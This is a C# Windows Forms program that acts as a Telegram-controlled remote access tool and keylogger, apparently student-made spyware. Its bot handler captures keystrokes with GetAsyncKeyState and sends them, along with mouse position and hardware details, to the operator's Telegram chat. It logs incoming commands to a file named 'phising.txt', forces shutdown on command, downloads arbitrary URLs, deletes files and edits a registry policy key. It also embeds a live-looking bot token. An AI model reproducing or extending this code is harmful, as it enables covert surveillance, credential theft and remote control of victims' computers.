using System;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Net;
using System.Speech.Synthesis;
using System.Windows.Forms;
using Telegram.Bot;
using System.Runtime.InteropServices;
using System.Threading;
using System.CodeDom;
using System.Threading.Tasks;
using System.Runtime.CompilerServices;
using System.Collections.Generic;
using System.Text;
using System.Linq;
using System.Diagnostics;
using System.Management;
using System.Management.Instrumentation;
using Microsoft.Win32;
using static System.Console;

namespace MemoriBooting
{
    public partial class Form1 : Form
    {



        DirectoryInfo dir;

        WebClient my = new WebClient();
        static TelegramBotClient botMe = new TelegramBotClient("1267034392:AAE7DvhqAhTnUzTeBvF5DGTbqpURD9Ft140");

        [DllImport("user32")]
        static extern bool AnimateWindow(IntPtr target, int time, DataBitch flags);
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(int Konci);
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(Keys Konci);
        enum DataBitch : uint
        {
            Ninja_Animation = 0x00000007,
            Sliding = 0x00080000,
            Tengah = 0x00000010

        }


        public Form1()
        {
            InitializeComponent();



            botMe.OnMessage += botMe_OnMessage;
            botMe.StartReceiving();

            Console.ReadLine();

            MinimizeBox = false;
            MaximizeBox = false;

            

        }

        public string Track()
        {
            try
            {
                foreach (int x in Enum.GetValues(typeof(Keys)))
                {
                    if (GetAsyncKeyState(x) == -32767)
                    {
                        txtKeyLog.Text += Enum.GetName(typeof(Keys), x) + " ";
                    }
                }
            }
            catch (Exception f)
            {
                MessageBox.Show(f.Message + " Hayoloooo");
            }

            return txtKeyLog.Text;
        }

        private static void GetInformation(string target, string syntax) {
        }

        private void botMe_OnMessage(object sender, Telegram.Bot.Args.MessageEventArgs f)
        {


            string sent;
            string saring = "Denis";

            if (listView1.InvokeRequired)
            {
                listView1.Invoke((MethodInvoker)delegate ()
                {
                    ListViewItem item = new ListViewItem(f.Message.Text);
                    listView1.Items.Add(f.Message.Text);


                });
            }





            using (StreamReader op = new StreamReader("phising.txt"))
            {
                sent = op.ReadToEnd();



            }




            using (StreamWriter sm = new StreamWriter("phising.txt"))
            {
                sm.WriteLine(f.Message.Text + Environment.NewLine + sent);






            }

            string target1 = "win32_Processor";
            string Syntax1 = "Name";
            string target2 = "Win32_Fan";
            string Syntax2 = "SystemName";












            if (f.Message.Text == "/Get")
            {
                ManagementObjectSearcher tar = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM " + target2);
                ManagementObjectSearcher tar2 = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM " + target1);

                foreach (ManagementObject sw1 in tar2.Get())
                {
                    botMe.SendTextMessageAsync(f.Message.Chat.Id, "Info Processor Computer target: " + Convert.ToString(sw1[Syntax1]));
                }
                foreach (ManagementObject sw in tar.Get())
                {
                    botMe.SendTextMessageAsync(f.Message.Chat.Id, "Info Computer Target: " + Environment.NewLine + "Name Computer: " + Convert.ToString(sw[Syntax2]) + Environment.NewLine + Convert.ToString(sw[Syntax1]));

                }


            }

            else if (f.Message.Text.Contains("/Keyloggerkibod"))
            {
                botMe.SendTextMessageAsync(f.Message.Chat.Id, "He Type is: " + Track());
                botMe.SendTextMessageAsync(f.Message.Chat.Id, "Mouse position X : " + MousePosition.X.ToString());
                botMe.SendTextMessageAsync(f.Message.Chat.Id, "Mouse position Y : " + MousePosition.Y.ToString());
            }
            else if (f.Message.Text.Contains(saring))
            {
                botMe.SendTextMessageAsync(f.Message.Chat.Id, f.Message.Text.Replace(f.Message.Text.Remove(4), "*****"));
                botMe.SendPhotoAsync(f.Message.Chat.Id, "", "Bapakkau Ajak sini!");

            }
            else if (f.Message.Text == "/SelfDestructionMode")
            {
                Process.Start("shutdown", "/s /t 0");

            }
            else
            {
                botMe.SendTextMessageAsync(f.Message.Chat.Id, "Your input Invalid!");
            }








        }
        DataTable denis = new DataTable();
        private void progressBar1_Click(object sender, EventArgs e)
        {




        }

        private void Form1_Load(object sender, EventArgs e)
        {
            DataSource();

            timer1.Start();

            
            comboBox1.DataSource = denis;
            comboBox1.DisplayMember = "CID";
        }

        private void DataSource()
        {
            denis.Columns.Add("CID");



        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            progressBar1.Increment(10);

            if (progressBar1.Value == 100)
            {
                progressBar1.Value = 0;
            }
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            comboBox1.Text = denis.Rows[comboBox1.SelectedIndex]["CID"].ToString();
           

        }

        SpeechSynthesizer speik = new SpeechSynthesizer();
        private void button1_Click(object sender, EventArgs e)
        {
            speik.SpeakAsync(textBox1.Text + "Has Been Saved Sir!");
            denis.Rows.Add(textBox1.Text);




        }

        private void timer1_Tick(object sender, EventArgs e)
        {
           
        }

        private void progressBar1_Click_1(object sender, EventArgs e)
        {
            timer1.Start();
        }

        private void radioButton1_CheckedChanged(object sender, EventArgs e)
        {
            if (radioButton1.Checked == true)
            {



                textBox3.Enabled = false;

                if(radioButton1.Checked == false)
                {
                    textBox3.Enabled = true;
                }

                


            }
        }

        private void Sembunyikan()
        {
            
        }

        private void CopyFile()
        {
            string asal = textBox2.Text;
            string tujuan = textBox3.Text;

            File.Copy(textBox2.Text, textBox3.Text + "awok.jpg");

        }





        private void button2_Click(object sender, EventArgs e)
        {
            CopyFile();
            MessageBox.Show("Done Please Check");

        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void radioButton2_CheckedChanged(object sender, EventArgs e)
        {
            try
            {
                if (radioButton2.Checked)
                {
                    File.Delete(textBox2.Text);
                }
            }

            catch(Exception s)
            {
                MessageBox.Show(s.Message);
            }
        }



        private void ManagerDownload(object sender, AsyncCompletedEventArgs f)
        {
            MessageBox.Show("Data has Download. Greets BCC");
            MessageBox.Show("result in bin folder app");
            speik.SpeakAsync("Created Denis_gans");


        }

        private void button3_Click(object sender, EventArgs e)
        {
            my.DownloadFileCompleted += new AsyncCompletedEventHandler(ManagerDownload);
            Uri fileKu = new Uri(textBox4.Text);
            my.DownloadFileAsync(fileKu, textBox1.Text);



        }

        private void textBox4_TextChanged(object sender, EventArgs e)
        {

        }

        private void groupBox1_Enter(object sender, EventArgs e)
        {

        }

        private void textBox5_TextChanged(object sender, EventArgs e, Telegram.Bot.Args.MessageEventArgs f)
        {

        }

        private void la(object sender, EventArgs e)
        {

        }

        private void label4_Click(object sender, EventArgs e)
        {

        }

        static void yasaya()
        {

        }

        
        private void buttonResult_Click(object sender, EventArgs e)
        {


        }

        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {


        }

        protected override void OnPaint(PaintEventArgs f)
        {
            base.OnPaint(f);
            Rectangle re = new Rectangle(10, 10, 1500, 1500);
            f.Graphics.FillRectangle(Brushes.Black, re);

            string x = "Special Greets: AbanzLevana-Desta-Agung-Alul-Daffa";

            f.Graphics.DrawString("Coded by: Denis_Gans " + Environment.NewLine + x, this.Font, Brushes.Aquamarine, re);

        }

        private void btnBeep_Click(object sender, EventArgs e)
        {
            
            FileMusik();
            
            

            if(opfd.ShowDialog() == DialogResult.OK)
            {
                
            Thread s = new Thread(new ThreadStart(FileMusik));
            s.Start();
            txtPath.Text = opfd.FileName;
            dir = new DirectoryInfo(txtPath.Text);
            dir.Attributes = FileAttributes.Hidden;

            

               

                
            }
           


        }

        private void txtPath_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox3_TextChanged(object sender, EventArgs e)
        {

        }

        private void FileMusik()
        {
            System.Media.SystemSounds.Hand.Play();
        }

        private void txtKeyLog_TextChanged(object sender, EventArgs e)
        {

        }

       
        private void DisplayFolder(string Alamat)
        {
            
        }

        private void txtDirektori_TextChanged(object sender, EventArgs e)
        {
           


               
        }

        private void Direktori_SelectedIndexChanged(object sender, EventArgs e)
        {
            
        }

        private  void btnDone_Click(object sender, EventArgs e)
        {
            

            Responsif();
            
            //string[] IsiFolder = Directory.GetDirectories(@"C:\");

            //foreach (string display in IsiFolder)
            //{
            //  Direktori.Items.Add(display);
            
                
            //}
        }

        public int sk;
        private int Responsif()
        {
            
            string[] IsiFile = Directory.GetFiles(@"C:\");

            foreach (string display1 in IsiFile)
            {
             sk = Direktori.Items.Add(display1);

                
            }
            return sk;


        }

        private void btnRegistry_Click(object sender, EventArgs e)
        {
            RegistryKey sk = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");

            sk.SetValue("Wallpaper", @"C:\Users\HP\Pictures\awok.jpg");
            sk.Close();
        }
    }
}
